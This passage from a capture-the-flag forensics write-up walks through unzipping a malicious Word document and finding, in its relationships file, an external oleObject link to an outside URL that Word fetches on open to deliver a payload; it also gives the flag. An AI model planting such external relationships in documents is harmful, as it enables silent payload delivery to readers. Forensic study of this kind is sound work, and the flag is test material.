without any macros or user interaction required. This technique bypasses many macro-based defenses.

---

5. Exploitation Steps

1. File Type Identification: Ran file malware.doc — confirmed it was OOXML (ZIP), not a legacy .doc.
1. Archive Extraction: Unzipped the document to inspect internal XML structure:
   unzip malware.doc -d contents/
1. Relationship File Inspection: Examined word/\_rels/document.xml.rels — the file that declares all external and
   internal resource references used by the document.
1. IoC Discovery: Found a suspicious Relationship entry with an anomalous Id="rId999" (legitimate IDs are sequentially
   small numbers), typed as oleObject with TargetMode="External", pointing to a non-Microsoft domain:
   <Relationship Id="rId999"
     Type=".../oleObject"
     Target="https://happy.divide.cloud/nowyouknow.html"
     TargetMode="External"/>
1. This URL would be silently fetched by Word upon opening the document, acting as a beaconing/payload delivery
   mechanism.

---

6. Getting the Flag

The suspicious IoC URL embedded in the document's relationship file was:

https://happy.divide.cloud/nowyouknow.html

Flag: hack10{https://happy.divide.cloud/nowyouknow.html}
